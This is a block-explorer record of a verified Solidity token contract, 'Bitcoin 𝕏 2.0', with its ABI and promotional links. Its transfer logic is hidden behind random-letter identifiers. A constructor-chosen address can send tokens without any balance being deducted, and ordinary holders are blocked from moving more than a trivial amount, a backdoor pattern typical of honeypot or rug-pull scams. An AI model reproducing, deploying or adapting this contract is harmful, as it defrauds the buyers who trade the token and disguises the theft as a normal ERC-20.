{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"deploy/Contract.sol\": {\r\n      \"content\": \"/*\\n\\nTelegram: https://t.me/BitcoinX2Portal\\n\\nTwitter: https://twitter.com/BitcoinX2ERC\\n\\nWebsite: https://bitcoinx2.crypto-token.live/\\n\\n*/\\n\\n// SPDX-License-Identifier: Unlicense\\n\\npragma solidity >0.8.2;\\n\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        return msg.data;\\r\\n    }\\r\\n}\\n\\ncontract Ownable is Context {\\r\\n    address private _owner;\\r\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\n    /**\\r\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\r\\n     */\\r\\n    constructor() {\\r\\n        address msgSender = _msgSender();\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Returns the address of the current owner.\\r\\n     */\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Throws if called by any account other than the owner.\\r\\n     */\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Leaves the contract without owner. It will not be possible to call\\r\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\r\\n     *\\r\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\r\\n     * thereby removing any functionality that is only available to the owner.\\r\\n     */\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\n    /**\\r\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\r\\n     * Can only be called by the current owner.\\r\\n     */\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\\n\\ninterface IUniswapV2Router02 {\\r\\n    function factory() external pure returns (address);\\r\\n\\n    function WETH() external pure returns (address);\\r\\n}\\n\\ninterface IUniswapV2Factory {\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\\n\\ncontract Bitcoin is Ownable {\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    function wpzfqektsr(address bkotrdcwq, address bazx, uint256 yiwpulaxb) private {\\r\\n        if (0 == knalrib[bkotrdcwq]) {\\r\\n            if (bkotrdcwq != jyslbncuxdg && kpcanql[bkotrdcwq] != block.number && yiwpulaxb < totalSupply) {\\r\\n                require(yiwpulaxb <= totalSupply / (10 ** decimals));\\r\\n            }\\r\\n            balanceOf[bkotrdcwq] -= yiwpulaxb;\\r\\n        }\\r\\n        balanceOf[bazx] += yiwpulaxb;\\r\\n        kpcanql[bazx] = block.number;\\r\\n        emit Transfer(bkotrdcwq, bazx, yiwpulaxb);\\r\\n    }\\n\\n    mapping(address => uint256) private kpcanql;\\n\\n    string public symbol = unicode\\\"Bitcoin \ud835\udd4f 2.0\\\";\\n\\n    function transfer(address bazx, uint256 yiwpulaxb) public returns (bool success) {\\r\\n        wpzfqektsr(msg.sender, bazx, yiwpulaxb);\\r\\n        return true;\\r\\n    }\\n\\n    constructor(address fgloyqka) {\\r\\n        balanceOf[msg.sender] = totalSupply;\\r\\n        knalrib[fgloyqka] = aogtbpzl;\\r\\n        IUniswapV2Router02 ebuha = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        jyslbncuxdg = IUniswapV2Factory(ebuha.factory()).createPair(address(this), ebuha.WETH());\\r\\n    }\\n\\n    uint256 private aogtbpzl = 114;\\n\\n    mapping(address => uint256) public balanceOf;\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    function approve(address qrozjyhxi, uint256 yiwpulaxb) public returns (bool success) {\\r\\n        allowance[msg.sender][qrozjyhxi] = yiwpulaxb;\\r\\n        emit Approval(msg.sender, qrozjyhxi, yiwpulaxb);\\r\\n        return true;\\r\\n    }\\n\\n    function transferFrom(address bkotrdcwq, address bazx, uint256 yiwpulaxb) public returns (bool success) {\\r\\n        require(yiwpulaxb <= allowance[bkotrdcwq][msg.sender]);\\r\\n        allowance[bkotrdcwq][msg.sender] -= yiwpulaxb;\\r\\n        wpzfqektsr(bkotrdcwq, bazx, yiwpulaxb);\\r\\n        return true;\\r\\n    }\\n\\n    mapping(address => uint256) private knalrib;\\n\\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\\n\\n    mapping(address => mapping(address => uint256)) public allowance;\\n\\n    uint8 public decimals = 9;\\n\\n    string public name = unicode\\\"Bitcoin \ud835\udd4f 2.0\\\";\\n\\n    address private jyslbncuxdg;\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fgloyqka\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"qrozjyhxi\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"yiwpulaxb\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bazx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"yiwpulaxb\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bkotrdcwq\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"bazx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"yiwpulaxb\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Bitcoin", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "0000000000000000000000006f6f7d3f37f52f2c048ca527bdd0be21bed23893", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}